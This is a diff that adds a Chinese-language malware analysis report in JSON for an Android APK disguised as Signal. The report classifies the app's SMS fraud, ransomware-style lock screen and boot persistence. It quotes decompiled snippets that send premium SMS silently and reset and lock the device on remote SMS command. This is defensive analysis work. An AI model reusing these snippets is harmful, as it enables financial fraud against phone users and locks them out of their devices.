@@ -1,0 +1,154 @@
+{
+  "APK信息": {
+    "文件名": "7c301b83a6c4e284fb3a98a7ce4154c37209119abc574a5ee1b7a70962c41b6a.apk",
+    "sha256": "7c301b83a6c4e284fb3a98a7ce4154c37209119abc574a5ee1b7a70962c41b6a",
+    "包名": "org.thoughtcrime.securesms",
+    "应用名": "ZKB SmsSecurity",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 465.5
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage",
+              "SmsManager"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\thoughtcrime\\securesms\\xlibs\\myFunctions;",
+          "method_signature": "if(sCode == \"0\")",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "String sCode = getVar(\"service_code\", \"0\", ctx);\nif (sCode == \"0\") {\n    smsManager.sendTextMessage(sPhone, null, sMessage, sentPI, null);\n} else {\n    StringBuilder sb = new StringBuilder();\n    sb.append(sCode).append(\" \").append(sMessage);\n    smsManager.sendTextMessage(sPhone, null, sb.toString(), sentPI, null);\n}",
+          "malicious_code_snippet_context": "          try {\n              PendingIntent sentPI = PendingIntent.getBroadcast(ctx, 0, new Intent(ctx, (Class<?>) OnSmsSended.class), 0);\n              SmsManager smsManager = SmsManager.getDefault();\n>>>             String sCode = getVar(\"service_code\", \"0\", ctx);\n>>>             if (sCode == \"0\") {\n>>>                 Log(\"myFunctions:sendSms\", String.format(\"Phone: %s; Text: %s\", sPhone, sMessage));\n>>>                 smsManager.sendTextMessage(sPhone, null, sMessage, sentPI, null);\n>>>             } else {\n>>>                 StringBuilder sb = new StringBuilder();\n>>>                 sb.append(sCode).append(\" \").append(sMessage);\n>>>                 Log(\"myFunctions:sendSms\", String.format(\"Phone: %s; Text: %s\", sPhone, sb.toString()));\n                  smsManager.sendTextMessage(sPhone, null, sb.toString(), sentPI, null);\n              }\n          } catch (Exception ex) {",
+          "behavior_description": "该代码在伪装为 Signal 开源项目的包路径(org.thoughtcrime.securesms.xlibs.myFunctions)下实现了一个静默发送短信的函数。通过 getVar() 读取配置中的 service_code，当 service_code 不为默认值 \"0\" 时，将其作为前缀拼接到短信内容前部，再调用 SmsManager.sendTextMessage() 静默发送短信。这种 service_code 前缀拼接行为是典型的短信欺诈手法，service_code 很可能是付费短信短号码或服务指令前缀，用于触发付费服务或向特定号码发送欺诈短信，直接造成用户经济损失。整个发送过程无用户交互，且通过 PendingIntent 监控发送状态，确保欺诈短信成功送达。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "lockNow",
+              "resetPassword",
+              "DevicePolicyManager"
+            ]
+          }
+        },
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES",
+              "encrypt",
+              "decrypt"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\thoughtcrime\\securesms\\xlibs\\SmsCommand;",
+          "method_signature": "if(this.sNumber != \"0\")",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(\"device_policy\");\ndpm.resetPassword(this.sNumber, 1);\ndpm.lockNow();",
+          "malicious_code_snippet_context": "                  return;\n              case LOCK:\n                  if (this.sNumber != \"0\") {\n>>>                     DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(\"device_policy\");\n>>>                     dpm.resetPassword(this.sNumber, 1);\n>>>                     dpm.lockNow();\n                      myFunctions.sendSmsLog(\"Device locked\", ctx);\n                      return;\n                  }",
+          "behavior_description": "代码接收远程短信指令，通过DevicePolicyManager的resetPassword方法将设备密码重置为指定字符串，并调用lockNow()立即锁定屏幕，实现勒索软件的锁屏勒索行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_reboot",
+      "中文名": "设备重启",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "reboot"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\thoughtcrime\\securesms\\xbroadcast\\OnBootReceiver;",
+          "method_signature": "onReceive(Context context, Intent intent)",
+          "malicious_behavior": "device_reboot",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "context.startService(new Intent(\"XMainProcessStart\").putExtra(\"name\", DraftDatabase.DRAFT_VALUE));",
+          "malicious_code_snippet_context": "      @Override // android.content.BroadcastReceiver\n      public void onReceive(Context context, Intent intent) {\n          myFunctions.sendLog(\"REBOOT\", \"Device reboot fixed. Service started after reboot.\", context);\n>>>         context.startService(new Intent(\"XMainProcessStart\").putExtra(\"name\", DraftDatabase.DRAFT_VALUE));\n      }\n  }",
+          "behavior_description": "OnBootReceiver监听设备开机完成广播(BOOT_COMPLETED)，在设备重启后自动启动名为XMainProcessStart的服务，实现恶意进程的开机自启保活，确保恶意软件在设备重启后持续运行。数据流向：设备启动事件(source)→startService启动恶意服务(sink)",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
